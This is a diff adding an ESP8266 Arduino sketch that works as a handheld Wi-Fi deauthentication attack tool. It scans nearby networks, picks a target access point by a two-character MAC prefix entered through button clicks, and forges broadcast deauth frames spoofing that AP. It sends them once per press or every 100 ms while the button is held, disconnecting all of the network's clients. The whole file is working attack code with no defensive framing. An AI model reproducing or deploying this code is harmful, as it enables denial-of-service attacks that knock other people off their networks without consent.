@@ -1,0 +1,256 @@
+#define BUTTON_PIN 0  // IO0 button
+#define LED_PIN 2      // Built-in LED
+
+unsigned long pressStart = 0;
+unsigned long lastPressTime = 0;
+unsigned long holdLast = 0;
+bool buttonPressed = false;
+bool inputMode = false;
+bool waitingForClicks = false;
+int step = 0;
+char selectedChars[3] = "";  // Store two characters + null terminator
+int charIndex = 0;
+int clickCount = 0;
+bool isHold = false;
+#include <ESP8266WiFi.h>
+extern "C" {
+  #include "user_interface.h"
+}
+bool sendHold = false;
+// Variables to store target network information
+String targetSSID = ""; // Replace with the network name you want to deauth
+uint8_t targetMAC[6];
+bool targetFound = false;
+
+uint8_t deauthPacket[26] = {
+  0xC0, 0x00,                         // Frame Control: deauth frame
+  0x3A, 0x01,                         // Duration
+  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast address (disconnects all clients)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (to be replaced with target MAC)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (to be replaced with target MAC)
+  0x00, 0x00,                         // Fragment & sequence number
+  0x07, 0x00                          // Reason code: 0x07 (Class 3 frame received from nonassociated STA)
+};
+
+
+
+void setup() {
+    pinMode(BUTTON_PIN, INPUT_PULLUP);
+    pinMode(LED_PIN, OUTPUT);
+     WiFi.mode(WIFI_STA); // Set ESP8266 to station mode for scanning
+    Serial.begin(115200);
+
+    int n = WiFi.scanNetworks();
+    Serial.println("Scanning for networks...");
+
+    for (int i = 0; i < n; ++i) {
+      uint8_t* mac = WiFi.BSSID(i); // Get full MAC address (BSSID)
+      String ssid = WiFi.SSID(i);
+
+      if (ssid.length() < 1) continue; // Skip if SSID is empty
+
+      // Print BSSID to check what you're scanning for
+      Serial.print("BSSID: ");
+      for (int j = 0; j < 6; j++) {
+        Serial.printf("%02X", mac[j]);
+        if (j < 5) Serial.print(":");
+      }
+      Serial.println();
+
+
+    }
+    runNext("");
+}
+
+void loop() {
+    if (digitalRead(BUTTON_PIN) == LOW) { // Button pressed
+        boolean didBlink = false;
+        if (!buttonPressed) {
+            pressStart = millis();
+            buttonPressed = true;
+        }else{
+        unsigned long pressDuration = millis() - pressStart;
+        if (pressDuration >= 3000 && !didBlink) {  // Enter input mode
+          didBlink=true;
+          blinkLED(3);
+        }
+        }
+    } else if (buttonPressed) { // Button released
+        unsigned long pressDuration = millis() - pressStart;
+        buttonPressed = false;
+
+        if (inputMode) {
+            processInput(pressDuration);
+        }
+        if(!inputMode && pressDuration <= 1000){
+          sendDeauth();
+          blinkLED(1);
+          sendHold = false;
+        }else if(!inputMode && pressDuration > 1000 && pressDuration < 3000){
+          sendHold = true;
+        }else if (pressDuration >= 3000) {  // Enter input mode
+          blinkLED(3);
+            inputMode = true;
+            step = 0;
+            charIndex = 0;
+            Serial.println("Input Mode Activated");
+            return;
+        }
+
+
+
+    }
+
+    // Handle click counting timeout
+    if (waitingForClicks && millis() - lastPressTime > 1000) {
+        finalizeStep();
+    }
+
+    if(sendHold && (millis()-holdLast) > 100){
+      holdLast = millis();
+      sendDeauth();
+      blinkLED(1);
+    }
+}
+
+void processInput(unsigned long duration) {
+    if (duration < 500) {  // Short click
+        clickCount++;
+        lastPressTime = millis();
+        waitingForClicks = true;
+    } else {  // Long hold
+        isHold = true;
+        finalizeStep();
+    }
+}
+
+void finalizeStep() {
+    if (!waitingForClicks) return; // No clicks to process
+
+    static char category = ' ';  // 'N' for numbers, 'L' for letters
+    static int subGroup = -1;
+    static int exactValue = -1;
+
+    if (step == 0) {  // Choose Number or Letter
+        category = isHold ? 'L' : 'N';
+        Serial.println(category == 'N' ? "Number selected" : "Letter selected");
+        step++;
+    } 
+    else if (category == 'N') {  // Handling Numbers
+        if (step == 1) {
+            blinkLED(1);
+            subGroup = isHold ? 6 : 1;  // 1-5 or 6-0 based on hold or not
+            Serial.print("Number group: ");
+            Serial.println(subGroup == 1 ? "1-5" : "6-0");
+            step++;
+        } else if (step == 2) {
+            blinkLED(2);
+            exactValue = subGroup + clickCount - 1;
+            if (exactValue == 10) exactValue = 0;  // Adjust for 0
+            selectedChars[charIndex++] = '0' + exactValue;
+            Serial.print("Number chosen: ");
+            Serial.println(exactValue);
+            finalizeInput();
+        }
+    } 
+    else if (category == 'L') {  // Handling Letters
+        if (step == 1) {
+            int letterGroup = clickCount - 1;  // 0=A-I, 1=J-R, 2=S-Z
+            subGroup = letterGroup * 9;
+            Serial.print("Letter range: ");
+            Serial.println(letterGroup == 0 ? "A-I" : (letterGroup == 1 ? "J-R" : "S-Z"));
+            step++;
+        } 
+        else if (step == 2) {
+            subGroup += isHold ? 5 : 0;  // First 5 or Last 5
+            Serial.print("Subgroup: ");
+            Serial.println(isHold ? "6-10" : "1-5");
+            step++;
+        } 
+        else if (step == 3) {
+            exactValue = subGroup + clickCount - 1;
+            selectedChars[charIndex++] = 'A' + exactValue;
+            Serial.print("Letter chosen: ");
+            Serial.println(char(selectedChars[charIndex - 1]));
+            finalizeInput();
+        }
+    }
+
+    // Reset for next step
+    waitingForClicks = false;
+    clickCount = 0;
+    isHold = false;
+}
+
+void finalizeInput() {
+    if (charIndex == 2) {
+        selectedChars[2] = '\0';
+        Serial.print("Final input: ");
+        Serial.println(selectedChars);
+        runNext(String(selectedChars));
+        inputMode = false;
+    } else {
+        step = 0;
+    }
+}
+
+void blinkLED(int times) {
+    for (int i = 0; i < times; i++) {
+        digitalWrite(LED_PIN, HIGH);
+        delay(300);
+        digitalWrite(LED_PIN, LOW);
+        delay(300);
+    }
+}
+
+void runNext(String selectedChars) {
+  // Start Wi-Fi scan
+  int n = WiFi.scanNetworks();
+  Serial.println("Scanning for networks...");
+  for (int i = 0; i < n; ++i) {
+    String ssid = WiFi.SSID(i);
+    Serial.println(".."+ssid);
+    uint8_t* mac = WiFi.BSSID(i); // Get the MAC address of the scanned network
+
+    // Convert the first two bytes of MAC address to uppercase hex string
+    char macStr[3]; // Two hex characters + null terminator
+    sprintf(macStr, "%02X", mac[0]); // Convert first byte to hexadecimal
+
+    String macPrefix = String(macStr); // Convert to String
+    Serial.println(macPrefix);
+    macPrefix.toUpperCase(); // Ensure uppercase
+    if (macPrefix == selectedChars) {
+      Serial.println("Target network found: " + ssid);
+
+      // Copy MAC address of the found network
+      WiFi.BSSID(i); // Get BSSID directly (returns a pointer)
+      memcpy(targetMAC, WiFi.BSSID(i), 6); // Copy the MAC address into our array
+
+      Serial.print("Target MAC: ");
+      for (int j = 0; j < 6; j++) {
+        deauthPacket[10 + j] = targetMAC[j]; // Set source MAC in packet
+        deauthPacket[16 + j] = targetMAC[j]; // Set BSSID in packet
+        Serial.printf("%02X", targetMAC[j]);
+        if (j < 5) Serial.print(":");
+      }
+      Serial.println();
+      targetFound = true;
+      break;
+    }
+  }
+
+  if (!targetFound) {
+    Serial.println("Target network not found. Blinking");
+  } else {
+    wifi_set_channel(WiFi.channel()); // Set ESP8266 to target AP’s channel
+  }
+}
+
+void sendDeauth() {
+  Serial.println("attempt");
+  if (targetFound) {
+    Serial.print("Sending deauth packet: ");
+    Serial.println(wifi_send_pkt_freedom(deauthPacket, 26, 0));
+    delay(1); // Short delay to prevent overloading
+  }
+}
